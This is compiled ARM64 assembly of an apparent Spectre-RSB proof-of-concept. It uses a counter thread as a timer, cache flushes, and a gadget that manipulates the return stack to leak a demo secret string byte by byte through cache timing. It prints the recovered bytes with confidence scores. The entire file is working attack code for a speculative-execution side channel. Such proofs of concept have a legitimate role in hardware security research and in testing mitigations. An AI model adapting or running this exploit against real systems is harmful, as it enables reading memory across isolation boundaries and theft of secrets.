	.arch armv8-a
	.file	"source.c"
	.global	counter
	.bss
	.align	3
	.type	counter, %object
	.size	counter, 8
counter:
	.zero	8
	.global	miss_min
	.align	3
	.type	miss_min, %object
	.size	miss_min, 8
miss_min:
	.zero	8
	.global	array1
	.data
	.align	3
	.type	array1, %object
	.size	array1, 160
array1:
	.byte	1
	.byte	2
	.byte	3
	.byte	4
	.byte	5
	.byte	6
	.byte	7
	.byte	8
	.byte	9
	.byte	10
	.byte	11
	.byte	12
	.byte	13
	.byte	14
	.byte	15
	.byte	16
	.zero	144
	.comm	channel,131072,8
	.global	secret
	.section	.rodata
	.align	3
.LC0:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw",@progbits
	.align	3
	.type	secret, %object
	.size	secret, 8
secret:
	.xword	.LC0
	.comm	garbage,4,4
	.comm	s,1,1
	.text
	.align	2
	.global	inc_counter
	.type	inc_counter, %function
inc_counter:
	sub	sp, sp, #16
	str	x0, [sp, 8]
.L2:
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	ldr	x0, [x0]
	add	x1, x0, 1
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	str	x1, [x0]
#APP
// 25 "source.c" 1
	DMB SY
// 0 "" 2
#NO_APP
	b	.L2
	.size	inc_counter, .-inc_counter
	.align	2
	.type	timed_read, %function
timed_read:
	sub	sp, sp, #32
	str	x0, [sp, 8]
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	ldr	x0, [x0]
	str	x0, [sp, 24]
	ldr	x0, [sp, 8]
#APP
// 37 "source.c" 1
	DSB SY
LDR X5, [x0]
DSB SY

// 0 "" 2
#NO_APP
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	ldr	x1, [x0]
	ldr	x0, [sp, 24]
	sub	x0, x1, x0
	add	sp, sp, 32
	ret
	.size	timed_read, .-timed_read
	.align	2
	.type	flush, %function
flush:
	sub	sp, sp, #16
	str	x0, [sp, 8]
	ldr	x0, [sp, 8]
#APP
// 50 "source.c" 1
	DC CIVAC, x0
// 0 "" 2
// 53 "source.c" 1
	DSB SY
// 0 "" 2
#NO_APP
	nop
	add	sp, sp, 16
	ret
	.size	flush, .-flush
	.align	2
	.global	measure_latency
	.type	measure_latency, %function
measure_latency:
	stp	x29, x30, [sp, -48]!
	add	x29, sp, 0
	mov	x0, 1048575
	str	x0, [x29, 32]
	str	wzr, [x29, 28]
	b	.L7
.L9:
	adrp	x0, :got:array1
	ldr	x0, [x0, #:got_lo12:array1]
	bl	flush
	adrp	x0, :got:array1
	ldr	x0, [x0, #:got_lo12:array1]
	bl	timed_read
	str	x0, [x29, 40]
	ldr	x1, [x29, 40]
	ldr	x0, [x29, 32]
	cmp	x1, x0
	bcs	.L8
	ldr	x0, [x29, 40]
	str	x0, [x29, 32]
.L8:
	ldr	w0, [x29, 28]
	add	w0, w0, 1
	str	w0, [x29, 28]
.L7:
	ldr	w0, [x29, 28]
	cmp	w0, 299
	ble	.L9
	ldr	x0, [x29, 32]
	ldp	x29, x30, [sp], 48
	ret
	.size	measure_latency, .-measure_latency
	.align	2
	.global	gadget
	.type	gadget, %function
gadget:
#APP
// 97 "source.c" 1
	mov X2, sp
// 0 "" 2
// 98 "source.c" 1
	DC CIVAC, X2
// 0 "" 2
// 101 "source.c" 1
	ldp x29, x30, [sp], 0x20
// 0 "" 2
// 104 "source.c" 1
	ret

// 0 "" 2
#NO_APP
	nop
	ret
	.size	gadget, .-gadget
	.comm	j,4,4
	.align	2
	.global	spectre_rsb
	.type	spectre_rsb, %function
spectre_rsb:
	stp	x29, x30, [sp, -32]!
	add	x29, sp, 0
	str	x0, [x29, 24]
	ldr	x0, [x29, 24]
	mov	w1, w0
	adrp	x0, :got:j
	ldr	x0, [x0, #:got_lo12:j]
	str	w1, [x0]
	bl	gadget
	adrp	x0, :got:secret
	ldr	x0, [x0, #:got_lo12:secret]
	ldr	x1, [x0]
	adrp	x0, :got:j
	ldr	x0, [x0, #:got_lo12:j]
	ldr	w0, [x0]
	sxtw	x0, w0
	add	x0, x1, x0
	ldrb	w0, [x0]
	lsl	w2, w0, 9
	adrp	x0, :got:channel
	ldr	x1, [x0, #:got_lo12:channel]
	sxtw	x0, w2
	ldrb	w0, [x1, x0]
	mov	w1, w0
	adrp	x0, :got:garbage
	ldr	x0, [x0, #:got_lo12:garbage]
	ldr	w0, [x0]
	eor	w1, w1, w0
	adrp	x0, :got:garbage
	ldr	x0, [x0, #:got_lo12:garbage]
	str	w1, [x0]
	nop
	ldp	x29, x30, [sp], 32
	ret
	.size	spectre_rsb, .-spectre_rsb
	.align	2
	.global	readByte
	.type	readByte, %function
readByte:
	sub	sp, sp, #1088
	stp	x29, x30, [sp, -32]!
	add	x29, sp, 0
	str	x19, [sp, 16]
	str	x0, [x29, 56]
	str	x1, [x29, 48]
	str	x2, [x29, 40]
	adrp	x0, :got:__stack_chk_guard
	ldr	x0, [x0, #:got_lo12:__stack_chk_guard]
	ldr	x1, [x0]
	str	x1, [x29, 1112]
	mov	x1,0
	str	wzr, [x29, 72]
	b	.L14
.L15:
	ldrsw	x0, [x29, 72]
	lsl	x0, x0, 2
	add	x1, x29, 1120
	add	x0, x1, x0
	sub	x0, x0, #4096
	str	wzr, [x0, 3064]
	ldr	w0, [x29, 72]
	add	w0, w0, 1
	str	w0, [x29, 72]
.L14:
	ldr	w0, [x29, 72]
	cmp	w0, 255
	ble	.L15
	mov	w0, 999
	str	w0, [x29, 68]
	b	.L16
.L33:
	str	wzr, [x29, 72]
	b	.L17
.L18:
	ldr	w0, [x29, 72]
	lsl	w0, w0, 9
	sxtw	x1, w0
	adrp	x0, :got:channel
	ldr	x0, [x0, #:got_lo12:channel]
	add	x0, x1, x0
	bl	flush
	ldr	w0, [x29, 72]
	add	w0, w0, 1
	str	w0, [x29, 72]
.L17:
	ldr	w0, [x29, 72]
	cmp	w0, 255
	ble	.L18
	str	wzr, [x29, 64]
	b	.L19
.L20:
	ldr	w0, [x29, 64]
	add	w0, w0, 1
	str	w0, [x29, 64]
.L19:
	ldr	w0, [x29, 64]
	cmp	w0, 99
	ble	.L20
	ldr	x0, [x29, 56]
	bl	spectre_rsb
	str	wzr, [x29, 72]
	b	.L21
.L23:
	ldr	w1, [x29, 72]
	mov	w0, 167
	mul	w0, w1, w0
	add	w0, w0, 13
	and	w0, w0, 255
	str	w0, [x29, 84]
	ldr	w0, [x29, 84]
	lsl	w0, w0, 9
	sxtw	x1, w0
	adrp	x0, :got:channel
	ldr	x0, [x0, #:got_lo12:channel]
	add	x0, x1, x0
	bl	timed_read
	mov	x19, x0
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	ldr	x0, [x0]
	cmp	x19, x0
	bhi	.L22
	ldr	w0, [x29, 84]
	cmp	w0, 0
	beq	.L22
	ldrsw	x0, [x29, 84]
	lsl	x0, x0, 2
	add	x1, x29, 1120
	add	x0, x1, x0
	sub	x0, x0, #4096
	ldr	w0, [x0, 3064]
	add	w0, w0, 1
	ldrsw	x1, [x29, 84]
	lsl	x1, x1, 2
	add	x2, x29, 1120
	add	x1, x2, x1
	sub	x1, x1, #4096
	str	w0, [x1, 3064]
.L22:
	ldr	w0, [x29, 72]
	add	w0, w0, 1
	str	w0, [x29, 72]
.L21:
	ldr	w0, [x29, 72]
	cmp	w0, 255
	ble	.L23
	mov	w0, -1
	str	w0, [x29, 80]
	ldr	w0, [x29, 80]
	str	w0, [x29, 76]
	str	wzr, [x29, 72]
	b	.L24
.L29:
	ldr	w0, [x29, 76]
	cmp	w0, 0
	blt	.L25
	ldrsw	x0, [x29, 72]
	lsl	x0, x0, 2
	add	x1, x29, 1120
	add	x0, x1, x0
	sub	x0, x0, #4096
	ldr	w1, [x0, 3064]
	ldrsw	x0, [x29, 76]
	lsl	x0, x0, 2
	add	x2, x29, 1120
	add	x0, x2, x0
	sub	x0, x0, #4096
	ldr	w0, [x0, 3064]
	cmp	w1, w0
	blt	.L26
.L25:
	ldr	w0, [x29, 76]
	str	w0, [x29, 80]
	ldr	w0, [x29, 72]
	str	w0, [x29, 76]
	b	.L27
.L26:
	ldr	w0, [x29, 80]
	cmp	w0, 0
	blt	.L28
	ldrsw	x0, [x29, 72]
	lsl	x0, x0, 2
	add	x1, x29, 1120
	add	x0, x1, x0
	sub	x0, x0, #4096
	ldr	w1, [x0, 3064]
	ldrsw	x0, [x29, 80]
	lsl	x0, x0, 2
	add	x2, x29, 1120
	add	x0, x2, x0
	sub	x0, x0, #4096
	ldr	w0, [x0, 3064]
	cmp	w1, w0
	blt	.L27
.L28:
	ldr	w0, [x29, 72]
	str	w0, [x29, 80]
.L27:
	ldr	w0, [x29, 72]
	add	w0, w0, 1
	str	w0, [x29, 72]
.L24:
	ldr	w0, [x29, 72]
	cmp	w0, 255
	ble	.L29
	ldr	w0, [x29, 76]
	cmp	w0, 0
	beq	.L35
	ldrsw	x0, [x29, 76]
	lsl	x0, x0, 2
	add	x1, x29, 1120
	add	x0, x1, x0
	sub	x0, x0, #4096
	ldr	w1, [x0, 3064]
	ldrsw	x0, [x29, 80]
	lsl	x0, x0, 2
	add	x2, x29, 1120
	add	x0, x2, x0
	sub	x0, x0, #4096
	ldr	w0, [x0, 3064]
	lsl	w0, w0, 1
	add	w0, w0, 5
	cmp	w1, w0
	bge	.L32
	ldrsw	x0, [x29, 76]
	lsl	x0, x0, 2
	add	x1, x29, 1120
	add	x0, x1, x0
	sub	x0, x0, #4096
	ldr	w0, [x0, 3064]
	cmp	w0, 2
	bne	.L31
	ldrsw	x0, [x29, 80]
	lsl	x0, x0, 2
	add	x1, x29, 1120
	add	x0, x1, x0
	sub	x0, x0, #4096
	ldr	w0, [x0, 3064]
	cmp	w0, 0
	beq	.L32
	b	.L31
.L35:
	nop
.L31:
	ldr	w0, [x29, 68]
	sub	w0, w0, #1
	str	w0, [x29, 68]
.L16:
	ldr	w0, [x29, 68]
	cmp	w0, 0
	bgt	.L33
.L32:
	ldr	w0, [x29, 76]
	uxtb	w1, w0
	ldr	x0, [x29, 48]
	strb	w1, [x0]
	ldrsw	x0, [x29, 76]
	lsl	x0, x0, 2
	add	x1, x29, 1120
	add	x0, x1, x0
	sub	x0, x0, #4096
	ldr	w1, [x0, 3064]
	ldr	x0, [x29, 40]
	str	w1, [x0]
	ldr	x0, [x29, 48]
	add	x0, x0, 1
	ldr	w1, [x29, 80]
	uxtb	w1, w1
	strb	w1, [x0]
	ldr	x0, [x29, 40]
	add	x0, x0, 4
	ldrsw	x1, [x29, 80]
	lsl	x1, x1, 2
	add	x2, x29, 1120
	add	x1, x2, x1
	sub	x1, x1, #4096
	ldr	w1, [x1, 3064]
	str	w1, [x0]
	nop
	adrp	x0, :got:__stack_chk_guard
	ldr	x0, [x0, #:got_lo12:__stack_chk_guard]
	ldr	x1, [x29, 1112]
	ldr	x0, [x0]
	eor	x0, x1, x0
	cmp	x0, 0
	beq	.L34
	bl	__stack_chk_fail
.L34:
	ldr	x19, [sp, 16]
	ldp	x29, x30, [sp], 32
	add	sp, sp, 1088
	ret
	.size	readByte, .-readByte
	.section	.rodata
	.align	3
.LC1:
	.string	"Error creating thread\n"
	.align	3
.LC2:
	.string	"Unreliable access timing\n"
	.align	3
.LC3:
	.string	"miss_min %d\n"
	.align	3
.LC4:
	.string	"Reading %d bytes starting at %p:\n"
	.align	3
.LC5:
	.string	"reading %p...\n"
	.align	3
.LC6:
	.string	"Success"
	.align	3
.LC7:
	.string	"Unclear"
	.align	3
.LC8:
	.string	"%s: "
	.align	3
.LC9:
	.string	"0x%02X='%c' score=%d "
	.align	3
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.text
	.align	2
	.global	main
	.type	main, %function
main:
	stp	x29, x30, [sp, -64]!
	add	x29, sp, 0
	adrp	x0, :got:__stack_chk_guard
	ldr	x0, [x0, #:got_lo12:__stack_chk_guard]
	ldr	x1, [x0]
	str	x1, [x29, 56]
	mov	x1,0
	adrp	x0, :got:inc_counter
	ldr	x1, [x0, #:got_lo12:inc_counter]
	add	x0, x29, 24
	mov	x3, 0
	mov	x2, x1
	mov	x1, 0
	bl	pthread_create
	cmp	w0, 0
	beq	.L54
	adrp	x0, :got:stderr
	ldr	x0, [x0, #:got_lo12:stderr]
	ldr	x1, [x0]
	adrp	x0, .LC1
	add	x0, x0, :lo12:.LC1
	mov	x3, x1
	mov	x2, 22
	mov	x1, 1
	bl	fwrite
	mov	w0, 1
	b	.L52
.L54:
	nop
.L39:
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	ldr	x1, [x0]
	mov	x0, 38527
	movk	x0, 0x98, lsl 16
	cmp	x1, x0
	bls	.L39
#APP
// 196 "source.c" 1
	DSB SY
// 0 "" 2
#NO_APP
	bl	measure_latency
	mov	x1, x0
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	str	x1, [x0]
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	ldr	x0, [x0]
	cmp	x0, 0
	bne	.L40
	adrp	x0, :got:stderr
	ldr	x0, [x0, #:got_lo12:stderr]
	ldr	x1, [x0]
	adrp	x0, .LC2
	add	x0, x0, :lo12:.LC2
	mov	x3, x1
	mov	x2, 25
	mov	x1, 1
	bl	fwrite
	mov	w0, 1
	bl	exit
.L40:
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	ldr	x0, [x0]
	sub	x1, x0, #1
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	str	x1, [x0]
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	ldr	x0, [x0]
	mov	w1, w0
	adrp	x0, .LC3
	add	x0, x0, :lo12:.LC3
	bl	printf
	str	wzr, [x29, 16]
	b	.L41
.L42:
	ldr	w0, [x29, 16]
	lsl	w2, w0, 9
	adrp	x0, :got:channel
	ldr	x1, [x0, #:got_lo12:channel]
	sxtw	x0, w2
	mov	w2, 1
	strb	w2, [x1, x0]
	ldr	w0, [x29, 16]
	add	w0, w0, 1
	str	w0, [x29, 16]
.L41:
	ldr	w0, [x29, 16]
	cmp	w0, 255
	ble	.L42
	str	xzr, [x29, 32]
	mov	w0, 16
	str	w0, [x29, 20]
	adrp	x0, :got:secret
	ldr	x0, [x0, #:got_lo12:secret]
	ldr	x1, [x0]
	adrp	x0, .LC4
	add	x0, x0, :lo12:.LC4
	mov	x2, x1
	ldr	w1, [x29, 20]
	bl	printf
	b	.L43
.L51:
	adrp	x0, :got:secret
	ldr	x0, [x0, #:got_lo12:secret]
	ldr	x1, [x0]
	ldr	x0, [x29, 32]
	add	x1, x1, x0
	adrp	x0, .LC5
	add	x0, x0, :lo12:.LC5
	bl	printf
	ldr	x0, [x29, 32]
	add	x1, x0, 1
	str	x1, [x29, 32]
	add	x2, x29, 40
	add	x1, x29, 48
	bl	readByte
	ldr	w1, [x29, 40]
	ldr	w0, [x29, 44]
	lsl	w0, w0, 1
	cmp	w1, w0
	blt	.L44
	adrp	x0, .LC6
	add	x0, x0, :lo12:.LC6
	b	.L45
.L44:
	adrp	x0, .LC7
	add	x0, x0, :lo12:.LC7
.L45:
	adrp	x1, .LC8
	add	x2, x1, :lo12:.LC8
	mov	x1, x0
	mov	x0, x2
	bl	printf
	ldrb	w0, [x29, 48]
	mov	w4, w0
	ldrb	w0, [x29, 48]
	cmp	w0, 31
	bls	.L46
	ldrb	w0, [x29, 48]
	cmp	w0, 126
	bhi	.L46
	ldrb	w0, [x29, 48]
	mov	w1, w0
	b	.L47
.L46:
	mov	w1, 63
.L47:
	ldr	w2, [x29, 40]
	adrp	x0, .LC9
	add	x0, x0, :lo12:.LC9
	mov	w3, w2
	mov	w2, w1
	mov	w1, w4
	bl	printf
	ldr	w0, [x29, 44]
	cmp	w0, 0
	ble	.L48
	ldrb	w0, [x29, 49]
	mov	w4, w0
	ldrb	w0, [x29, 49]
	cmp	w0, 31
	bls	.L49
	ldrb	w0, [x29, 49]
	cmp	w0, 126
	bhi	.L49
	ldrb	w0, [x29, 49]
	mov	w1, w0
	b	.L50
.L49:
	mov	w1, 63
.L50:
	ldr	w2, [x29, 44]
	adrp	x0, .LC10
	add	x0, x0, :lo12:.LC10
	mov	w3, w2
	mov	w2, w1
	mov	w1, w4
	bl	printf
.L48:
	mov	w0, 10
	bl	putchar
.L43:
	ldr	w0, [x29, 20]
	sub	w0, w0, #1
	str	w0, [x29, 20]
	ldr	w0, [x29, 20]
	cmp	w0, 0
	bge	.L51
	mov	w0, 10
	bl	putchar
	mov	w0, 0
.L52:
	adrp	x1, :got:__stack_chk_guard
	ldr	x1, [x1, #:got_lo12:__stack_chk_guard]
	ldr	x2, [x29, 56]
	ldr	x1, [x1]
	eor	x1, x2, x1
	cmp	x1, 0
	beq	.L53
	bl	__stack_chk_fail
.L53:
	ldp	x29, x30, [sp], 64
	ret
	.size	main, .-main
	.ident	"GCC: (Ubuntu/Linaro 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609"
	.section	.note.GNU-stack,"",@progbits
